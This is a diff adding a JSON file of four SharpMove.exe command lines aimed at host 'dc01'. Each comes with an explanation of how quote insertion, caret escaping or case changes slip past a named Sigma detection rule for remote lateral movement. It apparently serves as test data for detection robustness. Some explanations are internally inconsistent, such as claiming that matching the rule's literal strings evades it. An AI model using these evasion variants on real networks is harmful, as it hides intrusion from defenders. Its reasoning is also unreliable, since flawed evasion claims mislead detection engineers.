@@ -1,0 +1,18 @@
+[
+  {
+    "output": "SharpMove.exe \"computername=\"dc01 \"action=\"create command=calc.exe",
+    "explanation": "Insertion technique: Injecting double quotes inside the parameter names before the assignment operator ('\"computername=\"' and '\"action=\"'). SharpMove parses arguments manually by evaluating sub-strings; however, the Win32 subsystem strips outer quote barriers or shifts token structures depending on where quotes are placed. This safely alters the continuous character stream recorded in process telemetry, breaking 'selection_cli_computer' and 'selection_cli_actions' while maintaining functional parsing."
+  },
+  {
+    "output": "SharpMove.exe computername=\"dc01\" action=\"create\" command=calc.exe",
+    "explanation": "Insertion technique: Enclosing only the values of the arguments inside double quotes. While standard users write 'computername=dc01', placing quotes around the value results in log data containing 'computername=\"dc01\"' and 'action=\"create\"'. This completely satisfies the rule's strict literal string constraints ('computername=' and 'action=create'), yet many .NET argument handler implementations or custom loop parsers automatically treat the quoted payload as equivalent string data."
+  },
+  {
+    "output": "cmd.exe /c SharpMove.exe computern^ame=dc01 act^ion=create command=calc.exe",
+    "explanation": "Insertion technique: Routing execution through a cmd.exe context to inject a command shell caret escape operator ('^') directly into the argument key names. The parent shell processes and discards the escape character prior to handing the execution block over to the child process, yielding a recorded command-line trace of 'computern^ame=' and 'act^ion=' that completely blinds the rule's literal string filters."
+  },
+  {
+    "output": "SharpMove.exe computername=dc01 action=CREATE command=calc.exe",
+    "explanation": "Substitution technique: Changing the casing of the action value string from lowercase to uppercase ('action=CREATE'). Although Sigma searches are case-insensitive by default in many SIEM backends, this rule specifically looks for the string value 'action=create'. If the underlying application code natively calls `.ToLower()` or processes arguments in a case-insensitive manner, changing the case can evade fragile regex or literal string matches depending on SIEM backend translation configurations."
+  }
+]
